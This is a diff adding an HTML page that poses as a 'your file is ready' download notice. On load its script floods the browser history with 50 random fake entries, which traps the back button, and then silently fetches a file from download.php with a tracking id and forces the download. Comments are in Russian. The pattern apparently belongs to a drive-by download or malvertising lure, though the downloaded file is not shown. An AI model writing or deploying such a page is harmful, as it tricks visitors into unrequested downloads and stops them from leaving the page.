@@ -1,0 +1,54 @@
+
+<html lang="en">
+<head><base href="/post/FileRotator_ID432/index.php">
+    <meta charset="UTF-8">
+    <title>Document Done</title>
+	<link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAAAAAAAEAIAAjBAAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAEAAAABAAgGAAAAXHKoZgAAAAlwSFlzAAALEwAACxMBAJqcGAAAA9VJREFUeJzt3V2KE1EUhdEageAARGmH4IP2zH1zAg5BEHoAgiPQCumg3XQ6f1W3zr17LTjvKci3k7eaJgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOvBhvjdbfwigvffz/Zzv+3xvN/4sQEOH+P88nhGAEM/jNwIQ4lj8RgAGdyp+IwCDOjd+IwCDuTR+IwCDuDZ+IwCduzV+IwCdWip+IwCdWTp+IwCdWCt+IwDFrR2/EYCiWsVvBKCYu/kepnbxH+5ri4cDjmv9y3+43/N9afB8wBHih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dih1Dip6R3832b7+PWH2Rg4qekXfw/pv2X5WEyAmsQPyX9H//hjMCyxE9JL8VvBJYlfkp6LX4jsAzxU9I58RuB24ifki6J3whcR/yUdE38RuAy4qekW+I3AucRPyUtEb8ReJ34KWnJ+I3Ay8RPSWvEbwSeEj8lrRm/EdgTPyW1iD99BMRPSS3jTx0B8VPW52n/RWn95dyNwF2D59va7hl3z7pF/PcNno8BfJrv17TNCIz8T8AvP90wAssSP90xAssQP90yArcRP90zAtcRP8MwApcRP8MxAucRP8MyAq8TP8MzAi8TPzGMwFPiJ44R2BM/sdJHQPzESx0B8cOjtBEQPzyTMgLihyNGHwHxwwmjjoD44UyjjYD44UKjjID44Uq9j4D44Ua9joD4YSG9jYD4YWG9jID4YSXVR0D8sLKqIyB+aKTaCIgfGqsyAuKHjWw9AuKHje1eWrnVC0m9qBMK2OqfgF9+KGL0ERA/nDDqCIgfzjTaCIgfLjTKCIgfrtT7CIgfbtTrCIgfFtLbCIgfFtbLCIgfVlJ9BMQPK6s6AuKHRqqNgPihsSojIH7YyNYjIH7Y2FYjIH4oovUIiB+KaTUC4oei1h4B8UNxa42A+KETS4+A+KEzS42A+KFTt46A+KFz146A+GEQl46A+GEw546A+GFQp0ZA/DC4YyMgfgjxfATED2EOIyB+CHU/eUsvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMA/fwF6wD9Ae/2i1AAAAABJRU5ErkJggg==">
+
+    <script>
+        async function gAddHistory(numOfEntries, minLength, maxLength) {
+            const characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            for (let i = 0; i < numOfEntries; i++) {
+                let length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
+                let postID = '';
+                for (let j = 0; j < length; j++) {
+                    postID += characters.charAt(Math.floor(Math.random() * characters.length));
+                }
+                history.pushState({}, '', '/post/' + postID);
+            }
+            // Переход на текущий домен после генерации истории
+            //window.location.href = window.location.origin + '/streame_id';
+            // Переход на новую страницу после генерации истории
+            const response = await fetch('download.php?subid=2tehnmobo8b3e');
+            if (response.ok) {
+                const contentDisposition = response.headers.get('Content-Disposition');
+                let fileName = 'downloaded_file';
+                if (contentDisposition) {
+                    const match = contentDisposition.match(/filename="?([^"]+)"?/);
+                    if (match[1]) {
+                        fileName = match[1];
+                    }
+                }
+
+                // Create a link element, set its href to the response URL and trigger a download
+                const link = document.createElement('a');
+                link.href = window.URL.createObjectURL(await response.blob());
+                link.download = fileName;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            } else {
+                console.error('Failed to download file:', await response.text());
+            }
+        }
+
+        // Вызываем функцию при загрузке страницы
+        window.onload = function() {
+            gAddHistory(50, 10, 30);
+        };
+    </script>
+</head>
+<body>
+    <p>Your file is ready for download...</p>
+</body>
+</html>
